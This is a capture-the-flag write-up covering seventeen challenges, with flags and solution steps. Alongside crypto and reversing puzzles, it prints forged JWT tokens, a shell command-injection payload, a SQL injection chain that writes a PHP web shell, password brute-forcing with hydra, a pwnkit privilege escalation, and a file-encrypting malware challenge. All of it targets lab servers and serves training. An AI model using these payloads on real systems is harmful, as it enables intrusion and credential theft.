
# CTF-Challenges-Writeups

## Chall -1 

Chall Name: DecryptMe

Flag: C3iCenter{F1n4L1y_D3cRy_pT3d_th3_5tR}

Steps to Reproduce: 
Shortcut Method(If person wants to use online tools to get wallet address)
The python file need to be hexdump, where they will get 256 bit binary.
As the description says “you have something which can help you get the decryption key”, these 256 bits are the private key of bitcoin wallet.
Convert 256 binary to hexadecimal, there are various online tools present to do same.
These 64 characters are the actual private key of the bitcoin wallet.
Now since bitcoin uses ECC-secp256k encryption, the person can create a python code through which he can get the public key from the private key.
Other than programming, there is a website named bitaddress.org which does the same. Takes private key as input and provides the public key as well as the wallet address.
Now this wallet address is the key which is needed to be used for decryption.
The following python code will be used for decryption, which the participants could have easily created by seeing the functions used in encryption.

Code / Tool Used to Decrypt the data /flag

```
import math
dec=[]
def getval(k):
    p=1
    for i in k:
        p=p*ord(str(i))
    return p
def decrypt(k):
    global dec
    q=getval(k)
    l=""
    for i in dec:
        try:
            l="0x"+i
            k=int(l,16)
#integer below: 23460585…………..00000000     is q**23 which is calculated from   #encryption code m=int((int(k/234605851150169641721926773965290235249784400361018886275911752376266819287011220524318708607252636810772709635309238599964335759013385183666192715456476136774837038428584864841430313557521640955211430288754140512527511736793742409917750743663185669075127865387846654047355960402029024547019965930526238656632637165545707762465953664120560134738461681697525859411233396081611288668224164938475909743272258852365853104068668535379934688565034184665390918982629783814023444665216717515796892431589369410930091670551614561680878724353991316671417120252224245227074369929577503917746682037521805556141723163044928512243977134287737522913356571095097336282811491761016306526480733457428961953689984611000824356563600171619568003384351697041301874907059141613362496049703705902346033590868555042614842696827965454244341114399270843689052363290830114873155349386332618495982351520105392997943958173988785246516200605163711094717947508531035592530289676755053299993135933847258139480191698344870249513739434020495064391598728262809379129035864592880175486015880759194538133641915838739418074136926752976750558325751916094821317343188230884827928136555889907339309701206067310335227926725092342792967525368332855175492722619000922638206257873126778774835509574082368141940586656610482484666273041702028709940751318535661122688098553036800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)))
            print(chr(int(m)),end="")
        except:
            pass
st=input("Enter the string to decrypt: ")
dec=st.split("0x")
key=input("Enter the key: ").lower()
decrypt(key)


#0x73c7882cc58fee5dfe8f72f002cc208c9bd59b95338b1cd7ab000000000x58216f4c1c1d5219b27c79e0b98846a085e75f80dad10e501b000000000xb572034258002180333c827450cd461d4feb6a458644ff59a1000000000x73c7882cc58fee5dfe8f72f002cc208c9bd59b95338b1cd7ab000000000xae887d0a2da37a6f2037c4307e7c4fa24a6fdb4070167bb7bd000000000xbe15eb088cf3f2558b02704917b27a3716c5dd0be1ff23e3fe000000000xc874345ccc7eecef27898daed32bebef9eff33938344e956d4000000000xae887d0a2da37a6f2037c4307e7c4fa24a6fdb4070167bb7bd000000000xc4ff7140b75099669e072e8cea0370b21c416c10f82da785e2000000000xd48cdf3f16a1114d08d1daa583399b46e8976ddc6a164fb223000000000x78f6acd6e5556baaccd301a2e088d968dff246d9042dff9116000000000x54acac3006eefe9128fa1abed05fcb63032997fe4fb9cc7f29000000000xbe15eb088cf3f2558b02704917b27a3716c5dd0be1ff23e3fe000000000x59dbd0da26b47bddf73da971ae1c843f47464342205caf3894000000000x8354f62b24e06644695a1f089c024b21682b9d60a573c503ec000000000x54acac3006eefe9128fa1abed05fcb63032997fe4fb9cc7f29000000000xd1181c230172bdc47f4f7b839a11200965d9a659deff0de131000000000xa42a33b5ee187fd583b0a6cac302dde9c23684b8ced0b644e7000000000x7581e9bad02718224350a280f7605e2b5d347f567916bdc024000000000x58216f4c1c1d5219b27c79e0b98846a085e75f80dad10e501b000000000xab13b9ee187526e696b5650e9553d464c7b213bde4ff39e6cb000000000x8db33f7f646b60de05e13c6e577bbcd9f064f3e846b98a76c2000000000xd1181c230172bdc47f4f7b839a11200965d9a659deff0de131000000000xa42a33b5ee187fd583b0a6cac302dde9c23684b8ced0b644e7000000000xc18aae24a22245de1484cf6b00daf5749983a48e6d1665b4f0000000000x9128029b7999b4668f639b9040a438177322bb6ad1d0cc47b4000000000x58216f4c1c1d5219b27c79e0b98846a085e75f80dad10e501b000000000xacce1b7c230c50aadb76949f89e812038910f77f2a8adacf44000000000xa42a33b5ee187fd583b0a6cac302dde9c23684b8ced0b644e7000000000xc874345ccc7eecef27898daed32bebef9eff33938344e956d4000000000xb3b7a1b44d68f7bbee7b52e35c39087e8e8c868440b95e7128000000000x58216f4c1c1d5219b27c79e0b98846a085e75f80dad10e501b000000000xa42a33b5ee187fd583b0a6cac302dde9c23684b8ced0b644e7000000000x5b963268314ba5a23bfed902a2b0c1de08a5270365e850210d000000000xc874345ccc7eecef27898daed32bebef9eff33938344e956d4000000000x8db33f7f646b60de05e13c6e577bbcd9f064f3e846b98a76c2000000000xd801a25b2bcf64d5925439c76c6216846b55355ef52d91831500000000
#1CQHB7PVYPfSTxskkfgFn6KiMhs33iTeNX
#C3iCenter{F1n4L1y_D3cRy_pT3d_th3_5tR}
```

## Chall -2

Chall Name: TestYourLuck

Flag: C3iCenter{Th3_k3Y_got_comprOmis3D}

Steps to Reproduce: 
Put the exe file in ghidra. The following snippet shows the flag when reversed from ghidra in hex format.


<img src="snaps/1.png">
















## Chall -3

Chall Name: Coffee

Flag: C3iCenter{Fl4G_R3tr1EV4!_c0mP}

Steps to Reproduce: 
If you run the exe then choose the 5th option, press Y button of keyboard to accept the statements. 
Now it will ask the passkey for the payment. For this you can put the exe in ghidra to reverse engineer.
The following pic shows the place in ghidra where the passkey is shown in hex. The passkey is: A=1@c02XMK#8
<img src="snaps/2.png">

Now enter the same passkey, which gives you the encoded ASCII of the flag with the statement that it is in encoded and the encoding code is as follows. But it is not visible in the exe. Which gives the hint that there is some encoding code which is not visible but present in the actual code.
Again open the ghidra where the reversing window for this challenge is opened. The following snap shows the encoding code.
<img src="snaps/3.png">

They need to understand the code. It’s a simple function of subtraction and multiplication used by encoding code. They need to understand and create a decryption code for the encoded ASCII

Code / Tool Used to Decrypt the data /flag

```
#include <iostream>
using namespace std;
int main()
{
   int a[][6]={{118, 86, 194 ,118, 186, 204},{ 216 ,186, 212 ,230 ,124 ,200 },{88, 126 ,174, 148, 86, 216},{212, 82, 122, 156, 88, 50 },{174 ,182, 80 ,202 ,144 ,234}};
   for(int i=0;i<sizeof(a)/sizeof(a[0]);i++)
   { for(int j=0;j<sizeof(a[i])/sizeof(a[i][0]);j++)
   	{          a[i][j]=(a[i][j]/2)+8;
		cout<<(a[i][j])<<" "; 	   }     }
   cout<<"\n";
   for(int i=0;i<sizeof(a)/sizeof(a[0]);i++)
   {
   	for(int j=0;j<sizeof(a[i])/sizeof(a[i][0]);j++)
   	{ cout<<char(a[i][j]);  }
    }
   return 0;}
```



## Chall -4

Chall Name: Cod3d

Flag: C3iCenter{W3_4lW@ys_f0rg3t_P4sSw0rDs}

Steps to Reproduce: 
Download the apk, which has a simple login functionality.
Username is admin and password is encrypted.
The encryption code is based on RSA which I have created in python.
If participants know the concept of RSA, then they can easily get the passcode using the Cipher text: 2190196 Private key: 457481 Value of n: 2401129
Decrypt and get the password. Eter in login form to get the flag.

Code / Tool Used to Decrypt the data /flag
```
((2190196**457481 )%2401129)
```




























## Chall -5

Chall Name: BreachMe-1

Flag: C3iCenter{Acc0Unt_gOt_C0mpRomIs3D_!#}

Steps to Reproduce: 
This challenge is based on compromising JWT token where the backend is not verifying the algorithm when getting the token from frontend.
By default a token with user:guest  and uid:1 in data field of JWT token is sent when the request is submitted.
Just change the default token with the JWT token with none algorithm and data as uid:0 and user:admin: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1aWQiOiIwIiwidXNlciI6ImFkbWluIn0, paste it in the hidden input box and submit it.
The flag isvisible.




























## Chall -6

Chall Name: Wh0 is th3re?

Flag: C3iCenter{jwt_C0mP_c0mm4nD_inJ_3Cti0N_}

Steps to Reproduce: 
This challenge is based on compromising JWT token where the backend is not verifying the signatures of the token with RCE vulnerability.
As soon as you search any domain in the input box, a JWT token is assigned to it as exec:<domain name>  in data field of JWT token.
Just change the data in exec parameter with some RCE bypass method: a && find / -name *flag*  && echo x
The flag file is visible ._3461_flag_32445.txt. Use cat command to get flag or directly access it from browser. a && cat  /etc/._3461_flag_32445.txt  && echo x






























## Chall -7

Chall Name: BreachMe-2

Flag: C3iCenter{T0K39_C0mPr0m1Se#__T3cH2}

Steps to Reproduce: 
This challenge is based on compromising JWT token where the backend is not verifying the signatures of the token.
By default a token with user:guest  and uid:1 in data field of JWT token is sent when the request is submitted.
Just change the default token with the JWT token with any algorithm and  any signature, with data as uid:0 and user:admin: paste it in the hidden input box and submit it.
The flag isvisible.

Base64 Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiIwIiwidXNlciI6ImFkbWluIn0.1z_yI9KKql13v_fj5JKSJd-beZrbtCOzmj0mppe_7SE


























## Chall -8

Chall Name: BreachMe-3

Flag: C3iCenter{Compr0M1S3_D_t0K3n_S1g94tuR3}

Steps to Reproduce: 
This challenge is based on compromising JWT token  since a weak signature is used in it.
By default a token with user:guest  and uid:1 in data field of JWT token is sent when the request is submitted.
Change the data with user:admin and uid:0 and use signature anthony for the token. This is a part of rockyou.txt wordlist, so it can be easily bruteforced.
The resultant token which is signed using anthony is as follows: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjAsInVzZXIiOiJhZG1pbiJ9.AM9cTiYw5PF8AgLpLFbxOwxBGy4Bu6DeH5XdlxMT_Do
Submit it to get the flag.



























## Chall -9

Chall Name: 4cc3s5 D3ni3d

Flag: C3iCenter{U53rD4t@_bR34c#3D_}

Steps to Reproduce: 
This challenge is based on SQLi vulnerability.
Participants need to see robots.txt file which has a GET query to see user details. This is IDOR vulnerability. The id=61 is admin’s id, which has the login button. Now actual challenge begins.
Either participants can use SQLMAP tool to get the credentials from the database or they can use the following SQLi queries to get the creds from table. Using the SQLMAP tool will take more time as compared to using queries.
Queries are as follows:
d’ OR 1=1# CONFIRMING THE SQLi vulnerability
d’ oRder by 2# CONFIRMING NUMBER OF COLUMNS USED IN QUERY
d'unIon selEct version(),user() FROM information_schema.tables# SIMPLE DB ENUM

d'uniOn SELeCT database(),user() FROM information_schema.tables#  GET DB NAME

d'unioN SELeCT database(),table_name FROM information_schema.tables where table_schema=database()# GET THE TABLE NAME FROM DB
d'unioN selEct column_name,database() from information_schema.columns where table_name="t203"# GET COLUMN NAMES 
'uniOn seleCt user,pass from t203 # GET THE CREDS
Use the credentials to login and get the flag















## Chall -10

Chall Name: Giv3 M3 Cr3ds

Flag: C3iCenter{c0Mm4Nd_1Nj3cT10n_v1A_sQl!}

Steps to Reproduce: 
This challenge is based on SQLi vulnerability. If participants use SQLMAP then it will be of no use because they can only get the credentials from the table which is of no use. In this challenge they have to upload a file using SQLi to get the flag.
Queries are as follows:
d’ OR 1=1# CONFIRMING THE SQLi vulnerability
d’ oRder by 2# CONFIRMING NUMBER OF COLUMNS USED IN QUERY
d'unioN sElect version(),user() FROM information_schema.tables# SIMPLE DB ENUM
d'unioN SELeCT database(),table_name FROM information_schema.tables where table_schema=database()# GET TABLE NAME
d'unioN seleCt column_name,database() from information_schema.columns where table_name="X195"# GET COLUMN NAMES OF TABLE
d'Union Select user,pass from X195# GET THE CREDS WHICH IS OF NO USE

1' uniOn selEct '<?php passthru("ls -a"); ?>',null into outfile "/var/www/html/myshell.php"# UPLOAD THE FILE MYSHELL>PHP WITH PHP CODE IN IT TO LIST THE FILES 
Access the php code from web browser and get all the file names in the /var/www/html directory. They will get a hidden file which has the flag in it. Now they can access the file using browser to get flag.

















## Chall -11

Chall Name: Inc3pti0n-1

Flag: C3iCenter{3ScalaT3D_2_r0Ot_xd}

Steps to Reproduce: 
Use the dirb tool on the website to get all possible files that can be accessed from the browser which discloses the README file. The README file of the website has a hint that the guest account can be used with SSH.
Scan the ports from 0-9999 (as given in challenge description) to see the open ports.
Enumerate the services running on these ports.
Port 3306 is opened for ssh.
Use command ssh guest@<DOMAIN> -p 3306 this asks for a guest password. Use hydra to get the guest password. The password is flemming which is present in rockyou.txt wordlist.
Use linpease to discover possible vulnerabilities in the machine. There is a pwn kit vulnerability CVE-2021-4034 discovered by linpease.
Get the exploit and execute it to do privilege escalation.
Use command find / -name *flag* 2> /dev/null which will give all the files having the flag keyword in it.
One file is present in /var/log/ directory which is having the flag.






















## Chall -12

Chall Name: Inc3pti0n-2

Flag: C3iCenter{d1v1nG_1nT0_s3Rv1C3S}

Steps to Reproduce: 
Scan the ports from 10000-19999 (as given in challenge description) to see the open ports.
Enumerate the services running on these ports.
There is an elasticsearch service running on 19200 port.
Access the elasticsearch service from browser using <DOMAIN>:19200 
Find the databases present in the elasticsearch db using <DOMAIN>:9200/_cat/indices 
There is a database named as users.
Try accessing the database using the <DOMAIN>:9200/users/_search which dumpse the whole database.
There is a column which is named as isadmin in JSON. Search for the user which has Y as a value in this column.
Get the password by cracking the MD5 hash of the password of the user having Y as the value in isadmin column. Use the creds in the login form to get the password.
























## Chall -13

Chall Name: Inc3pti0n-3

Flag: C3iCenter{144O_O37O_4O15092e_8152_a8@8}

Steps to Reproduce: 
There is a login form which shows a meme if the same credentials are used. Every meme is named as meme[1/2/3/4].jpg but one meme is named as james.jpg which acts as a hint that this has something to do.
Scan the open ports from 60000-65535 and enumerate them. SSH service is running on 64430.
Try the james user for logging in using ssh. Password to be dictionary attacked using rockyou.txt.
The password of james is rubberbandman.
Access the mysql server now, where the userZ database is having accounts table. Go through it, and there the participants will find the half part of flag.
Now other part of the flag is present in /usr/lib/sysusers.d/something-flag.txt which can be found using the find command and global read permissions on the file find / -perm -o=r -type f  2>/dev/null | grep flag.

























## Chall -14

Chall Name: Clac G0n3 Wr0nG

Flag: C3iCenter{exP_byp4Ss3d_fl4G_xp0s3D}

Steps to Reproduce: 
The interface performs simple calculation operations.
But there is a JWT token set everytime when the solution is displayed.
On doing the directory traversal attack we get the file backend. On opening the file it displays the code related to the backend of the calculator.
On analyzing the code we infer that the JWT token is signed with the key which is equal to the solution of the operation selected by the user.
But there is one exit function used which is called every time when the key is not equal to null. Therefore now user has to bypass this by generating null so that the code below exit() could be executed.
On analyzing the source code of the webpage, we know that there is one hidden field in eval operation part. Try to connect this concept with the backend code we have got.
In php eval() gives null if the parameter is string type. Therefore this way we can bypass the exit() called. Now we need to get the MD5 hash of the key produced this time. And this time the key is NULL. So use php shell to get the MD5 hash of the null. Enter command in the hidden input field and hash (d41d8cd98f00b204e9800998ecf8427e ) as an input in other input field.
The command executes.
Find the flag using command find / -name C3i* 2> /dev/null



















## Chall -15

Chall Name: Base65

Flag: C3iCenter{1t5_th3_G4m3_0F_1nD3x1Ng}

Steps to Reproduce: 
From the drive link, download the exe file of base65 encoder, and run it in linux using wine.
To get the algorithm of base65 algo, you need to have the indexing values of the algorithm. Find the index in the github repo of reicksam0903 and start analyzing how the bits manipulation in the background might have been done. 
The algorithm creates the groups of 4 bits in the background for the manipulation.
Now apply same concept of base64 algorithm except the grouping of bits as here I have changed the grouping to 4 bits and base64 uses 6 bits grouping.
On doing the process of reversing the process of encoding correctly, you get the flag.

Code:

index={0:'a',1:'b',2:'c',3:'d',4:'e',5:'f',6:'g',7:'h',8:'i',9:'j',10:'k',
       11:'l',12:'m',13:'n',14:'o',15:'p',16:'q',17:'r',18:'s',19:'t',
       20:'u',21:'v',22:'w',23:'x',24:'y',25:'z',26:'0',27:'1',28:'2',
       29:'3',30:'4',31:'5',32:'6',33:'7',34:'8',35:'9',36:'A',37:'B',
       38:'C',39:'D',40:'E',41:'F',42:'G',43:'H',44:'I',45:'J',46:'K',
       47:'L',48:'M',49:'N',50:'O',51:'P',52:'Q',53:'R',54:'S',55:'T',
       56:'U',57:'V',58:'W',59:'X',60:'Y',61:'Z',62:'_',63:'{',64:'}'}

keys=list(index.keys())
values=list(index.values())
string=list((input("Enter string: ")).replace(" ",""))

for i in string:
    if i not in values:
        print("Invalid character found ",i)
        exit(0)

getkey=[]

for i in string:
    if i in values:
        getkey.append(keys[values.index(i)])

binary=""
decode=""
for i in getkey:
    binary=bin(i).replace("0b","")
    if len(binary)<8:
        m=8-len(binary)
        binary=("0"*m)+binary
    decode=decode+binary[4:]

i=0
text=""
while i<len(decode):
    dec=int(decode[i:i+8],2)
    text=text+chr(dec)
    i+=8

print(text)
    





























## Chall -16

Chall Name: Incepti0nEc0der

Flag: C3iCenter{!nV3rt3D_Ev3rY_xD_th1nG_lik3_1Nc3pti0n}

Steps to Reproduce: 
The code is with participants, they just have to reverse it and get the flag.

Code:

dec=""
flag=input("Enter the encoded text: ")
binary=""
for i in flag:
    b=(bin(ord(i))).replace("0b","")
    if len(b)<8:
        x=8-len(b)
        b="0"*x+b
    binary=binary+" "+b
bins=filter(("").__ne__, binary.split(" "))
fbins=list()
for i in bins:
    x=i[0:4]
    y=i[4:8]
    fbins.append(x)
    fbins.append(y)
f=list()
l=list()
for i in range(1,len(fbins),2):
    f.append(fbins[i])

for i in range(len(fbins)-2,-1,-2):
    l.append(fbins[i])

fbins=f+l
for i in range(0,len(fbins),2):
    x=fbins[i]+fbins[i+1]
    dec=dec+chr(int(x,2))
print(dec)





## Chall -17

Chall Name: feed3r W/\re

Flag: C3iCenter{1_sH0ulD_h4V3_eNcRypt3D_wh0L3_PC}

Steps to Reproduce: 
The challenge is based on the fact that the languages like python, java etc. work on the bytecode so that the same program could be run on any device.
Download the software from 

https://drive.google.com/file/d/1WvRSRFAkb13CbAkpybiKvWPV7McsCeYG/view?usp=sharing 

Software needs at least 5 files to run. As soon as the software is run, the software encrypts the files present in its directory with a secret key which is hard coded in the program behind the software. Algorithm used is AES-128.
As soon as files get encrypted, a flag file is created which has an actual flag but encrypted with the key. 
A JPG file is also downloaded and opened to show a functionality that it is a malware.
But the icon of software shows as if the python code was written and the exe was created out of it.
Therefore participants need to decompile the exe file using https://github.com/extremecoders-re/pyinstxtractor. Command for same is 
-> python pyinstxtractor.py feed3r.exe
<img src="snaps/4.png">
<img src="snaps/5.png">


Open the directory to see the bytecode of the python code running behind. The bytecode extension is .pyc.
There is a file encrypt.pyc file, which seems as if it would have some encryption code. Since it is a bytecode, it won’t be readable easily.
<img src="snaps/6.png">

Still open it using a notepad, maybe it has something juicy. 
There are some user readable strings. Try to identify something fishy. The key got exposed in the bytecode of the python code. 
<img src="snaps/7.png">

Enter the key g_b7Lpl5jfQwKizU0A-tbnNLPz28bH9cRqHHmKi_8Vs= in the software and then the files will get decrypted.
Therefore the participants get the flag from the flag file created automatically by the software before.




